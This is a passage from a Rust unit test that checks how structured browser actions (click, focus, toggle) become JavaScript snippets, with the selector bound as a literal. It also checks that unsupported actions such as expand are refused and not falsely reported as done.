            script_for(&Call::Struct(StructArgs::Invoke { selector: "#go".into(), action: a.into() }), ":doc")
        };
        let s = c("click").unwrap();
        assert!(s.contains("var s=\"#go\""), "the selector is still bound as a literal");
        assert!(s.contains("e.click();"));
        assert!(c("focus").unwrap().contains("e.focus();"));
        assert!(c("toggle").is_some());
        // A browser has no expand/collapse: refuse rather than click and
        // claim the node expanded.
        assert!(c("expand").is_none());
        assert!(c("wiggle").is_none());
    }
}
